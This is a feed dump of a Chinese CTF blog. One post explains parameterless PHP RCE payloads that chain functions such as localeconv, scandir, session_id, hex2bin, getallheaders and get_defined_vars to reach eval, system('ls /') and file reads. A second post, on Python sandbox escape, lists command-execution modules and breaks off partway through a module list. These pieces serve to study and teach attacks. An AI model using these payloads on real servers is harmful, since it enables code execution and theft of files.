function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br></code></pre></td></tr></table></figure><p>接下来逐个分析payload的构成：</p><p>1、var_dump(localeconv());可以看见第一个string[1]就是一个“.”，这个点是由localeconv()产生的</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129200501464.png" class title="image-20250129200501464"><p>2、利用<code>current()</code>函数将这个点取出来的，<code>‘.’</code>代表的是当前目录，那接下来就很好理解了，我们可以利用这个点完成遍历目录的操作，相当于就是<code>linux</code>中的<code>ls</code>指令</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129200643025.png" class title="image-20250129200643025"><p>3、既然current()取第一个值，那么current(localeconv())构造一个<code>&#39;.&#39;</code>,<strong>而</strong><code>&#39;.&#39;</code> <strong>表示当前目录</strong>，<code>scandir(&#39;.&#39;)</code> 将返回当前目录中的文件和子目录，这里我们得知flag所在的文件名就是flag.php</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129200853439.png" class title="image-20250129200853439"><p>4、然而flag的文件名在比较后端我们可以通过array_reverse()将数组内容反转，让它从倒数第二的位置变成正数第二</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129200918061.png" class title="image-20250129200918061"><p>5、移动指针读取第二个数组，参照下列数组移动操作可知我们应选用next()函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">end</span>() ： 将内部指针指向数组中的最后一个元素，并输出<br><span class="hljs-title function_ invoke__">next</span>() ：将内部指针指向数组中的下一个元素，并输出<br><span class="hljs-title function_ invoke__">prev</span>() ：将内部指针指向数组中的上一个元素，并输出<br><span class="hljs-title function_ invoke__">reset</span>() ： 将内部指针指向数组中的第一个元素，并输出<br><span class="hljs-title function_ invoke__">each</span>() ： 返回当前元素的键名和键值，并将内部指针向前移动<br></code></pre></td></tr></table></figure><p>6、最后用highlight_file()返回文件内容</p><p>使用最多最灵活的一个函数,可以构造出不同用法，这里直接引用了别人的payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))); <span class="hljs-comment">//查看和读取当前目录文件</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>()))); <span class="hljs-comment">//查看上一级目录的文件</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>()))));  <span class="hljs-comment">//查看上一级目录的文件</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>()))))))); <span class="hljs-comment">//读取上级目录文件</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))))))))));<span class="hljs-comment">//读取上级目录文件</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">phpversion</span>())))))))))))))));<span class="hljs-comment">//读取上级目录文件</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localtime</span>(<span class="hljs-title function_ invoke__">time</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>()))))))))))));<span class="hljs-comment">//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位</span><br>  <span class="hljs-comment">//查看和读取根目录文件</span><br>  <span class="hljs-comment">//查看和读取根目录文件</span><br></code></pre></td></tr></table></figure><h3 id="方法二：session-id"><a href="#方法二：session-id" class="headerlink" title="方法二：session_id()"></a>方法二：session_id()</h3><p> 使用条件：当请求头中有cookie时（或者走投无路手动添加cookie头也行，有些CTF题不会卡）</p><p> 首先我们需要开启session_start()来保证session_id()的使用，session_id可以用来获取当前会话ID，也就是说它可以抓取PHPSESSID后面的东西，但是phpsession不允许()出现</p><h4 id="法一：hex2bin（）"><a href="#法一：hex2bin（）" class="headerlink" title="法一：hex2bin（）"></a>法一：hex2bin（）</h4><p>我们自己手动对命令进行十六进制编码，后面在用函数hex2bin()解码转回去，使得后端实际接收到的是恶意代码。我们把想要执行的命令进行十六进制编码后，替换掉‘Cookie:PHPSESSID&#x3D;’后面的值</p><p>以下是十六进制编码脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$encoded</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-string">&quot;phpinfo();&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$encoded</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到phpinfo();的十六进制编码，即706870696e666f28293b</p><p>那么payload就可以是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?参数=<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">session_id</span>(<span class="hljs-title function_ invoke__">session_start</span>())));<br></code></pre></td></tr></table></figure><p>同时更改cookie后的值为想执行的命令的十六进制编码</p><h4 id="法二：读文件"><a href="#法二：读文件" class="headerlink" title="法二：读文件"></a>法二：读文件</h4><p>例题依然是[GXYCTF2019]禁止套娃，在知道文件名为flag.php的情况下直接读文件</p><p>如果已知文件名，把文件名写在PHPSESSID后面，构造payload为：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">readfile</span></span>(<span class="hljs-title">session_id</span>(<span class="hljs-title">session_start</span>()));</span><br></code></pre></td></tr></table></figure><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129201750646.png" class title="image-20250129201750646"><h3 id="方法三：getallheaders"><a href="#方法三：getallheaders" class="headerlink" title="方法三：getallheaders()"></a>方法三：getallheaders()</h3><p>getallheaders()返回当前请求的所有请求头信息，局限于Apache（apache_request_headers()和getallheaders()功能相似，可互相替代，不过也是局限于Apache）</p><p>当确定能够返回时，我们就能在数据包最后一行加上一个请求头，写入恶意代码，再用end()函数指向最后一个请求头，使其执行，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">getallheaders</span>()));<br></code></pre></td></tr></table></figure><p>借用别人的图演示：</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129202117068.png" class title="image-20250129202117068"><p>sky是自己添加的请求头， end()指向最后一行的sky后的代码，达到phpinfo的目的，然后可以进一步去rce。</p><h3 id="方法四：get-defined-vars"><a href="#方法四：get-defined-vars" class="headerlink" title="方法四：get_defined_vars()"></a>方法四：get_defined_vars()</h3><p>相较于getallheaders（）更加具有普遍性，它可以回显全局变量$_GET、$_POST、$_FILES、$_COOKIE，</p><p>返回数组顺序为$_GET–&gt;$_POST–&gt;$_COOKIE–&gt;$_FILES</p><p>首先确认是否有回显：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>());<br></code></pre></td></tr></table></figure><p>假如说原本只有一个参数a，那么可以多加一个参数b，后面写入恶意语句，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a=<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>())));&amp;b=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br></code></pre></td></tr></table></figure><p>把eval换成assert也行 ，能执行system(‘ls &#x2F;‘)就行</p><h3 id="方法五：chdir-array-rand-赌狗读文件"><a href="#方法五：chdir-array-rand-赌狗读文件" class="headerlink" title="方法五：chdir()&amp;array_rand()赌狗读文件"></a>方法五：chdir()&amp;array_rand()赌狗读文件</h3><p>实在无法rce，可以考虑目录遍历进行文件读取</p><p>利用<code>getcwd()</code>获取当前目录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">getcwd</span>());<br></code></pre></td></tr></table></figure><p>结合dirname()列出当前工作目录的父目录中的所有文件和目录:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())));<br></code></pre></td></tr></table></figure><p> 读上一级文件名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">?code=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))))));<br><br>?code=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))))))))));<br><br>?code=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">phpversion</span>())))))))))))))));<br></code></pre></td></tr></table></figure><p>读根目录:</p><p>ord() 函数和 chr() 函数：只能对第一个字符进行转码，ord() 编码，chr)解码，有概率会解码出斜杠读取根目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?code=<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>())))))));<br></code></pre></td></tr></table></figure><p>要用chdir()固定，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?code=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>() )))))))))));<br></code></pre></td></tr></table></figure><p>通过bp的intruder模块来读到根目录：</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129202327073.png" class title="image-20250129202327073"><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129202339375.png" class title="image-20250129202339375"><p>文章参考：<br><a href="https://blog.csdn.net/2301_76690905/article/details/133808536">https://blog.csdn.net/2301_76690905/article/details/133808536</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Python沙箱逃逸</title>
    <link href="/blog/2025/01/24/Python/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <url>/blog/2025/01/24/Python/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<h2 id="执行模块"><a href="#执行模块" class="headerlink" title="执行模块"></a>执行模块</h2><p>在Python中执行系统命令的方式有</p><ul><li>os</li><li>commands：仅限<code>2.x</code></li><li>subprocess：subprocess.getoutput(“whoami”),print(a);subprocess.run(“whoami”)</li><li>timeit：timeit.sys，<code>timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;, number=1)</code></li><li>platform：platform.os，platform.sys，platform.popen(‘whoami’, mode&#x3D;’r’, bufsize&#x3D;-1).read()</li><li>pty：pty.spawn(‘ls’)，pty.os</li><li>bdb：bdb.os，cgi.sys</li><li>cgi：cgi.os，cgi.sys</li><li>….</li></ul><p>下面是一个脚本，跑出了其中导入os或者sys还有<code>__builtins__</code>的库：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python">all_modules_Python2 = [<br>    <span class="hljs-string">&#x27;BaseHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;imaplib&#x27;</span>, <span class="hljs-string">&#x27;shelve&#x27;</span>, <span class="hljs-string">&#x27;Bastion&#x27;</span>, <span class="hljs-string">&#x27;anydbm&#x27;</span>, <span class="hljs-string">&#x27;imghdr&#x27;</span>, <span class="hljs-string">&#x27;shlex&#x27;</span>, <span class="hljs-string">&#x27;CDROM&#x27;</span>, <span class="hljs-string">&#x27;argparse&#x27;</span>, <span class="hljs-string">&#x27;imp&#x27;</span>, <span class="hljs-string">&#x27;shutil&#x27;</span>, <span class="hljs-string">&#x27;CGIHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;array&#x27;</span>, <span class="hljs-string">&#x27;importlib&#x27;</span>, <span class="hljs-string">&#x27;signal&#x27;</span>, <span class="hljs-string">&#x27;Canvas&#x27;</span>, <span class="hljs-string">&#x27;ast&#x27;</span>, <span class="hljs-string">&#x27;imputil&#x27;</span>, <span class="hljs-string">&#x27;site&#x27;</span>, <span class="hljs-string">&#x27;ConfigParser&#x27;</span>, <span class="hljs-string">&#x27;asynchat&#x27;</span>, <span class="hljs-string">&#x27;inspect&#x27;</span>, <span class="hljs-string">&#x27;sitecustomize&#x27;</span>, <span class="hljs-string">&#x27;Cookie&#x27;</span>, <span class="hljs-string">&#x27;asyncore&#x27;</span>, <span class="hljs-string">&#x27;io&#x27;</span>, <span class="hljs-string">&#x27;smtpd&#x27;</span>, <span class="hljs-string">&#x27;DLFCN&#x27;</span>, <span class="hljs-string">&#x27;atexit&#x27;</span>, <span class="hljs-string">&#x27;itertools&#x27;</span>, <span class="hljs-string">&#x27;smtplib&#x27;</span>, <span class="hljs-string">&#x27;Dialog&#x27;</span>, <span class="hljs-string">&#x27;audiodev&#x27;</span>, <span class="hljs-string">&#x27;json&#x27;</span>, <span class="hljs-string">&#x27;sndhdr&#x27;</span>, <span class="hljs-string">&#x27;DocXMLRPCServer&#x27;</span>, <span class="hljs-string">&#x27;audioop&#x27;</span>, <span class="hljs-string">&#x27;keyword&#x27;</span>, <span class="hljs-string">&#x27;socket&#x27;</span>, <span class="hljs-string">&#x27;FileDialog&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>, <span class="hljs-string">&#x27;lib2to3&#x27;</span>, <span class="hljs-string">&#x27;spwd&#x27;</span>, <span class="hljs-string">&#x27;FixTk&#x27;</span>, <span class="hljs-string">&#x27;bdb&#x27;</span>, <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;sqlite3&#x27;</span>, <span class="hljs-string">&#x27;HTMLParser&#x27;</span>, <span class="hljs-string">&#x27;binascii&#x27;</span>, <span class="hljs-string">&#x27;linuxaudiodev&#x27;</span>, <span class="hljs-string">&#x27;sre&#x27;</span>, <span class="hljs-string">&#x27;IN&#x27;</span>, <span class="hljs-string">&#x27;binhex&#x27;</span>, <span class="hljs-string">&#x27;locale&#x27;</span>, <span class="hljs-string">&#x27;sre_compile&#x27;</span>, <span class="hljs-string">&#x27;MimeWriter&#x27;</span>, <span class="hljs-string">&#x27;bisect&#x27;</span>, <span class="hljs-string">&#x27;logging&#x27;</span>, <span class="hljs-string">&#x27;sre_constants&#x27;</span>, <span class="hljs-string">&#x27;Queue&#x27;</span>, <span class="hljs-string">&#x27;bsddb&#x27;</span>, <span class="hljs-string">&#x27;lsb_release&#x27;</span>, <span class="hljs-string">&#x27;sre_parse&#x27;</span>, <span class="hljs-string">&#x27;ScrolledText&#x27;</span>, <span class="hljs-string">&#x27;bz2&#x27;</span>, <span class="hljs-string">&#x27;macpath&#x27;</span>, <span class="hljs-string">&#x27;ssl&#x27;</span>, <span class="hljs-string">&#x27;SimpleDialog&#x27;</span>, <span class="hljs-string">&#x27;cPickle&#x27;</span>, <span class="hljs-string">&#x27;macurl2path&#x27;</span>, <span class="hljs-string">&#x27;stat&#x27;</span>, <span class="hljs-string">&#x27;SimpleHTTPServer&#x27;</span>, <span class="hljs-string">&#x27;cProfile&#x27;</span>, <span class="hljs-string">&#x27;mailbox&#x27;</span>, <span class="hljs-string">&#x27;statvfs&#x27;</span>, <span class="hljs-string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="hljs-string">&#x27;cStringIO&#x27;</span>, <span class="hljs-string">&#x27;mailcap&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-string">&#x27;SocketServer&#x27;</span>, <span class="hljs-string">&#x27;calendar&#x27;</span>, <span class="hljs-string">&#x27;markupbase&#x27;</span>, <span class="hljs-string">&#x27;stringold&#x27;</span>, <span class="hljs-string">&#x27;StringIO&#x27;</span>, <span class="hljs-string">&#x27;cgi&#x27;</span>, <span class="hljs-string">&#x27;marshal&#x27;</span>, <span class="hljs-string">&#x27;stringprep&#x27;</span>, <span class="hljs-string">&#x27;TYPES&#x27;</span>, <span class="hljs-string">&#x27;cgitb&#x27;</span>, <span class="hljs-string">&#x27;math&#x27;</span>, <span class="hljs-string">&#x27;strop&#x27;</span>, <span class="hljs-string">&#x27;Tix&#x27;</span>, <span class="hljs-string">&#x27;chunk&#x27;</span>, <span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-string">&#x27;struct&#x27;</span>, <span class="hljs-string">&#x27;Tkconstants&#x27;</span>, <span class="hljs-string">&#x27;cmath&#x27;</span>, <span class="hljs-string">&#x27;mhlib&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;Tkdnd&#x27;</span>, <span class="hljs-string">&#x27;cmd&#x27;</span>, <span class="hljs-string">&#x27;mimetools&#x27;</span>, <span class="hljs-string">&#x27;sunau&#x27;</span>, <span class="hljs-string">&#x27;Tkinter&#x27;</span>, <span class="hljs-string">&#x27;code&#x27;</span>, <span class="hljs-string">&#x27;mimetypes&#x27;</span>, <span class="hljs-string">&#x27;sunaudio&#x27;</span>, <span class="hljs-string">&#x27;UserDict&#x27;</span>, <span class="hljs-string">&#x27;codecs&#x27;</span>, <span class="hljs-string">&#x27;mimify&#x27;</span>, <span class="hljs-string">&#x27;symbol&#x27;</span>, <span class="hljs-string">&#x27;UserList&#x27;</span>, <span class="hljs-string">&#x27;codeop&#x27;</span>, <span class="hljs-string">&#x27;mmap&#x27;</span>, <span class="hljs-string">&#x27;symtable&#x27;</span>, <span class="hljs-string">&#x27;UserString&#x27;</span>, <span class="hljs-string">&#x27;collections&#x27;</span>, <span class="hljs-string">&#x27;modulefinder&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;_LWPCookieJar&#x27;</span>, <span class="hljs-string">&#x27;colorsys&#x27;</span>, <span class="hljs-string">&#x27;multifile&#x27;</span>, <span class="hljs-string">&#x27;sysconfig&#x27;</span>, <span class="hljs-string">&#x27;_MozillaCookieJar&#x27;</span>, <span class="hljs-string">&#x27;commands&#x27;</span>, <span class="hljs-string">&#x27;multiprocessing&#x27;</span>, <span class="hljs-string">&#x27;syslog&#x27;</span>, <span class="hljs-string">&#x27;__builtin__&#x27;</span>, <span class="hljs-string">&#x27;compileall&#x27;</span>, <span class="hljs-string">&#x27;mutex&#x27;</span>, <span class="hljs-string">&#x27;tabnanny&#x27;</span>, <span class="hljs-string">&#x27;__future__&#x27;</span>, <span class="hljs-string">&#x27;compiler&#x27;</span>, <span class="hljs-string">&#x27;netrc&#x27;</span>, <span class="hljs-string">&#x27;talloc&#x27;</span>, <span class="hljs-string">&#x27;_abcoll&#x27;</span>, <span class="hljs-string">&#x27;contextlib&#x27;</span>, <span class="hljs-string">&#x27;new&#x27;</span>, <span class="hljs-string">&#x27;tarfile&#x27;</span>, <span class="hljs-string">&#x27;_ast&#x27;</span>, <span class="hljs-string">&#x27;cookielib&#x27;</span>, <span class="hljs-string">&#x27;nis&#x27;</span>, <span class="hljs-string">&#x27;telnetlib&#x27;</span>, <span class="hljs-string">&#x27;_bisect&#x27;</span>, <span class="hljs-string">&#x27;copy&#x27;</span>, <span class="hljs-string">&#x27;nntplib&#x27;</span>, <span class="hljs-string">&#x27;tempfile&#x27;</span>, <span class="hljs-string">&#x27;_bsddb&#x27;</span>, <span class="hljs-string">&#x27;copy_reg&#x27;</span>, <span class="hljs-string">&#x27;ntpath&#x27;</span>, <span class="hljs-string">&#x27;termios&#x27;</span>, <span class="hljs-string">&#x27;_codecs&#x27;</span>, <span class="hljs-string">&#x27;crypt&#x27;</span>, <span class="hljs-string">&#x27;nturl2path&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;_codecs_cn&#x27;</span>, <span class="hljs-string">&#x27;csv&#x27;</span>, <span class="hljs-string">&#x27;numbers&#x27;</span>, <span class="hljs-string">&#x27;textwrap&#x27;</span>, <span class="hljs-string">&#x27;_codecs_hk&#x27;</span>, <span class="hljs-string">&#x27;ctypes&#x27;</span>, <span class="hljs-string">&#x27;opcode&#x27;</span>, <span class="hljs-string">&#x27;_codecs_iso2022&#x27;</span>, <span class="hljs-string">&#x27;curses&#x27;</span>, <span class="hljs-string">&#x27;operator&#x27;</span>, <span class="hljs-string">&#x27;thread&#x27;</span>, <span class="hljs-string">&#x27;_codecs_jp&#x27;</span>, <span class="hljs-string">&#x27;datetime&#x27;</span>, <span class="hljs-string">&#x27;optparse&#x27;</span>, <span class="hljs-string">&#x27;threading&#x27;</span>, <span class="hljs-string">&#x27;_codecs_kr&#x27;</span>, <span class="hljs-string">&#x27;dbhash&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;time&#x27;</span>, <span class="hljs-string">&#x27;_codecs_tw&#x27;</span>, <span class="hljs-string">&#x27;dbm&#x27;</span>, <span class="hljs-string">&#x27;os2emxpath&#x27;</span>, <span class="hljs-string">&#x27;timeit&#x27;</span>, <span class="hljs-string">&#x27;_collections&#x27;</span>, <span class="hljs-string">&#x27;decimal&#x27;</span>, <span class="hljs-string">&#x27;ossaudiodev&#x27;</span>, <span class="hljs-string">&#x27;tkColorChooser&#x27;</span>, <span class="hljs-string">&#x27;_csv&#x27;</span>, <span class="hljs-string">&#x27;difflib&#x27;</span>, <span class="hljs-string">&#x27;parser&#x27;</span>, <span class="hljs-string">&#x27;tkCommonDialog&#x27;</span>, <span class="hljs-string">&#x27;_ctypes&#x27;</span>, <span class="hljs-string">&#x27;dircache&#x27;</span>, <span class="hljs-string">&#x27;pdb&#x27;</span>, <span class="hljs-string">&#x27;tkFileDialog&#x27;</span>, <span class="hljs-string">&#x27;_ctypes_test&#x27;</span>, <span class="hljs-string">&#x27;dis&#x27;</span>, <span class="hljs-string">&#x27;pickle&#x27;</span>, <span class="hljs-string">&#x27;tkFont&#x27;</span>, <span class="hljs-string">&#x27;_curses&#x27;</span>, <span class="hljs-string">&#x27;distutils&#x27;</span>, <span class="hljs-string">&#x27;pickletools&#x27;</span>, <span class="hljs-string">&#x27;tkMessageBox&#x27;</span>, <span class="hljs-string">&#x27;_curses_panel&#x27;</span>, <span class="hljs-string">&#x27;doctest&#x27;</span>, <span class="hljs-string">&#x27;pipes&#x27;</span>, <span class="hljs-string">&#x27;tkSimpleDialog&#x27;</span>, <span class="hljs-string">&#x27;_elementtree&#x27;</span>, <span class="hljs-string">&#x27;dumbdbm&#x27;</span>, <span class="hljs-string">&#x27;pkgutil&#x27;</span>, <span class="hljs-string">&#x27;toaiff&#x27;</span>, <span class="hljs-string">&#x27;_functools&#x27;</span>, <span class="hljs-string">&#x27;dummy_thread&#x27;</span>, <span class="hljs-string">&#x27;platform&#x27;</span>, <span 